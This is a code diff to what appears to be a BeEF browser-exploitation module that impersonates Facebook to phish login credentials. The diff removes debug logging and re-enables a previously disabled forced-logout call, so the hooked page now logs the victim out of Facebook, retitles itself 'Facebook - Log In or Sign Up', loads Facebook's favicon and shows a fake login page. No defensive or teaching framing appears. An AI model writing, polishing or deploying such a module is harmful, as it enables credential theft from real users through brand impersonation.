@@ -5,9 +5,6 @@
 //
 
 beef.execute(function() {
-    // Add debugging
-    console.log("FACEBOOK PHISHING MODULE STARTED!");
-    
     // Define functions inside beef.execute scope
     function logoutFacebook() {
         var img = document.createElement("IMG");
@@ -42,32 +39,14 @@ beef.execute(function() {
     
     // Wait for DOM to be fully ready
     function waitForDOM() {
-        console.log("DOM readyState:", document.readyState);
         if (document.readyState === 'complete' || document.readyState === 'interactive') {
             // DOM is ready - execute the module
-            console.log("DOM READY - Executing phishing module");
             document.title = "Facebook - Log In or Sign Up";
             beef.browser.changeFavicon("https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico");
-            
-            try {
-                console.log("About to call logoutFacebook()");
-                // logoutFacebook(); // Temporarily disabled for testing
-                console.log("logoutFacebook() completed");
-            } catch(e) {
-                console.log("Error in logoutFacebook():", e);
-            }
-            
-            console.log("haaAbout to call displayPhishingSite()");
-            
-            try {
-                displayPhishingSite();
-                console.log("displayPhishingSite() completed");
-            } catch(e) {
-                console.log("Error in displayPhishingSite():", e);
-            }
+            logoutFacebook();
+            displayPhishingSite();
         } else {
             // DOM not ready - wait and try again
-            console.log("DOM not ready, waiting...");
             setTimeout(waitForDOM, 100);
         }
     }
